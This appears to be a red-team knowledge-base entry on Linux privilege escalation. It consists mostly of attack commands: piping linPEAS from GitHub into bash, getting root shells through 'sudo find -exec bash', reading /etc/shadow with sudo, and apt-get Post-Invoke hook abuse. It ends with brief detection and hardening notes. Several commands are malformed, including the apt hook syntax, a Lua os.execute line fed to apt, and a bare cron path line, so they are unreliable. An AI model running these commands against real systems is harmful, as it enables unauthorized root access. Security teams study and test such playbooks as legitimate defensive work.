---
title: Linux Privilege Escalation
phase: post-explotacion
platform: linux
tags: [linux, privesc, sudo, kernel, suid]
risk: critical
attack_tactic: TA0004
attack_technique: T1068
data_sources: [audit-logs, syslog, bash-history]
last_review: 2026-05-25
---

# Linux Privilege Escalation

### Objetivo

Escalar de usuario raso a root en sistemas Linux abusando de configuraciones inseguras, binarios SUID, o vulnerabilidades del kernel.

### Enumeration Scripts

```bash
# LinPEASS
curl -L https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh | bash

# LinEnum
./LinEnum.sh -s -k -r -e -t

# unix-privesc-check
./unix-privesc-check standard
```

### SUID Binaries

```bash
# Find SUID binaries
find / -perm -4000 -type f -executable 2>/dev/null

# GTFOBins check
# https://gtfobins.github.io/
```

### sudo - misconfigurations

```bash
# Current sudo permissions
sudo -l

# Common privesc via sudo
sudo vim /etc/shadow
sudo vim /etc/sudoers
sudo find /tmp -exec bash -i \;
sudo apt-get update -o APT::Update::Post-Invoke:: /bin/bash
sudo less /etc/shadow
```

### Kernel Exploits

```bash
# Kernel version
uname -a
cat /etc/lsb-release

# Search exploits
searchsploit linux kernel <version>
```

### Cron Jobs and Init Scripts

```bash
# Cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
/var/spool/cron/ /etc/cron.*

# writable cron scripts
find /etc/cron* -type f -writable 2>/dev/null
```

### One-liners

```bash
# Find writable files in /etc
find /etc -type f -writable 2>/dev/null

# sudo apt-get abuse
echo 'os.execute("/bin/bash")' > /tmp/privesc
sudo apt-get update -o APT::Update::Post-Invoke:: /tmp/privesc
```

### Detección y Mitigación

- **Visibilidad:** Audit logs sudo commands, process creation with root EUID, file permission changes.
- **Hardening:** Audit SUID binaries, disable passwordless sudo, keep kernel patched, implement sudo version vet.

### Validación de Cobertura

- **Prueba técnica:** atomic-red-team T1068 (Linux privesc).
- **Criterio de éxito:** Alert on suspicious SUID binary execution or sudo privesc attempt.
